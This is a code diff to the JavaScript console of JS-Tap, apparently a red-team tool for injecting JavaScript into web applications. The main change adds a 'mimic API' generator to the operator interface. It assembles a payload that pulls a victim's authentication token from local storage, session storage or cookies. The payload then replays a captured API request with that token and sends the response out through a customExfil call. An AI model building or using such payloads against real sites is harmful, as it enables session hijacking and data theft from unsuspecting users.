@@ -1054,26 +1054,6 @@ function showNoteEditor(event, client, nickname, notes)
 
 
 
-// function showReqRespViewer2(eventKey, type)
-// {
-// 	prettyRequest  = window.js_beautify(atob(requestBody), {indent_size: 2});
-// 	prettyResponse = window.js_beautify(atob(responseBody), {indent_size: 2});
-
-// 	console.log("!!!! Request: " + prettyRequest);
-// 	console.log("!!!! Response: " + prettyResponse);
-
-// 	requestContent = document.getElementById("requestBox");
-// 	requestContent.innerHTML = prettyRequest;
-
-// 	responseContent = document.getElementById("responseBox");
-// 	responseContent.innerHTML = prettyResponse;
-
-
-
-// 	var modal = new bootstrap.Modal(document.getElementById('requestResponseModal'));
-// 	modal.show();	
-// }
-
 
 async function showReqRespViewer(eventKey, type)
 {
@@ -1147,7 +1127,7 @@ async function searchCSRFToken(eventKey, tokenName, tokenValue)
 
 
 
-async function searchAuthToken(eventKey, tokenName, tokenValue, apiType)
+async function searchAuthToken(eventKey, tokenValue, apiType)
 {
 	var searchDataDiv = document.getElementById('apiSearchDataDiv');
 
@@ -1158,7 +1138,6 @@ async function searchAuthToken(eventKey, tokenName, tokenValue, apiType)
 		method:"POST",
 		body: JSON.stringify({
 			type:apiType,
-			tokenName: tokenName,
 			tokenValue: tokenValue
 		}),
 		headers: {
@@ -1247,6 +1226,32 @@ async function showMimicApiModal(eventKey, apiCallDataString, apiType)
 	searchDataDiv.innerHTML = "";
 
 
+	// Need to get the request body
+	if (apiType == "XHR")
+	{
+		xhrCallReq  = await fetch('/api/clientXhrCall/' + eventKey);
+		xhrCallJson = await xhrCallReq.json();
+
+		requestBody  = xhrCallJson.requestBody;
+		responseBody = xhrCallJson.responseBody;
+	}
+	else if (apiType == "FETCH")
+	{
+		fetchCallReq  = await fetch('/api/clientFetchCall/' + eventKey);
+		fetchCallJson = await fetchCallReq.json();
+
+		requestBody  = fetchCallJson.requestBody;
+		responseBody = fetchCallJson.responseBody;
+	}
+	else
+	{
+		console.log("Invalid api type in showMimicApiModal()");
+	}
+
+	console.log("In mimic API, request body is: " + atob(requestBody));
+
+
+
 	searchButton.onclick = function(event) 
 	{
 		var canSearch = true;
@@ -1273,10 +1278,128 @@ async function showMimicApiModal(eventKey, apiCallDataString, apiType)
 
 		if (canSearch)
 		{
-			searchAuthToken(eventKey, tokenName.value.trim(), tokenValue.value.trim(), apiType)
+			searchAuthToken(eventKey, tokenValue.value.trim(), apiType)
 		}
 
 		searchButton.blur();
+	}
+
+
+    // Generate a mimic payload
+	nextButton.onclick = function(event)
+	{
+    	// Let's generate that payload
+		var payload = "";
+
+		payload += "// JS-Tap mimic generated API call payload\n";
+		payload += "// Payload variables below with intercepted values. Modify as you see fit.\n";
+		payload += "// ----------------------------------------------------------------------.\n";
+
+
+		//  I need to body from the API call here...
+		requestBodyJson = JSON.parse(atob(requestBody));
+
+		for (let key in requestBodyJson)
+		{
+			if (requestBodyJson.hasOwnProperty(key))
+			{
+				console.log("key: " + key + ", value: " + requestBodyJson[key]);
+				payload += `var var_${key} = '${requestBodyJson[key]}';\n`;
+			}
+		}
+
+		payload += "// ----------------------------------------------------------------------.\n";
+
+		switch(tokenLocation)
+		{
+			case 'Local Storage':
+			{
+				payload += `var foundAuthToken = localStorage.getItem('${tokenName.value.trim()}');\n`;
+			}
+			break;
+
+			case 'Session Storage':
+			{
+				payload += `var foundAuthToken = sessionStorage.getItem('${tokenName.value.trim()}');\n`;
+			}
+			break;
+
+			case 'Cookies':
+			{
+				payload += `var foundAuthToken = getCookie('${tokenName.value.trim()}');\n`;
+			}
+			break;
+
+		default:
+			alert('Authentication token not found.');
+		}
+
+
+		payload += "var bodyData = {\n";
+
+		for (let key in requestBodyJson)
+		{
+	  		if (requestBodyJson.hasOwnProperty(key)) 
+	  		{  // Check if the key is not from the prototype chain
+        		var variableName = key.replace(/-/g, '_');
+        		payload += `	"${key}": var_${variableName},\n`;
+    		}		
+		}
+		payload += "};\n";
+
+
+		payload += `fetch('${apiURL}', {\n`;
+		payload += `	method: '${apiMethod}',\n`;
+		payload += `	credentials: 'same-origin',\n`;
+		payload += '    headers: {\n';
+
+		// Pull the headers in:
+		for (let key in apiCallData.headers) 
+		{
+		    if (apiCallData.headers.hasOwnProperty(key)) 
+		    {
+		        var headerInfo = apiCallData.headers[key]; // Assuming this is already an object with 'header' and 'value'
+
+		        var headerName = headerInfo.header;
+		        var headerValue = headerInfo.value;
+
+		        console.log('$$$$$ Header Info: ', headerInfo);
+		        console.log('## Name: ' + headerName + ', Value: ' + headerValue);
+
+		        // Check if the key is the auth token
+		        if (headerName === tokenName.value.trim()) 
+		        {
+		            // this is our dynamic token
+		            console.log('&& found auth header!');
+		            payload += `        '${headerName}': foundAuthToken,\n`;
+		        } 
+		        else 
+		        {
+		            console.log('** handling non-auth header...');
+		            payload += `        '${headerName}': '${headerValue}',\n`;
+		        }
+		    }
+		}
+		payload += '    },\n';
+
+		payload += '	body: JSON.stringify(bodyData)\n';
+
+		payload += "})\n";
+		payload += ".then(response => {\n";
+		payload += "	var statusCode   = response.status;\n";
+		payload += "	return response.text().then(responseBody => {\n";
+		payload += "		customExfil('Payload Response, Status code: ' + statusCode, 'Response Body:' + responseBody);\n";
+		payload += "	});\n";
+		payload += "})\n";
+		payload += ".catch(error => {\n";
+		payload += "	customExfil('Error', 'Caught error in mimic payload');\n";
+		payload += "})\n";
+
+
+		nextButton.blur();
+		console.log("Payload dump:");
+		console.log(payload);
+
 	}
 
 
@@ -1390,7 +1513,7 @@ async function showMimicFormModal(eventKey, formDataString)
     	// Let's generate that payload
 		var payload = "";
 
-		payload += "// JS-Tap mimic generated payload\n";
+		payload += "// JS-Tap mimic generated form submission payload\n";
 		payload += "// Payload variables below with intercepted values. Modify as you see fit.\n";
 		payload += "// ----------------------------------------------------------------------.\n";
 
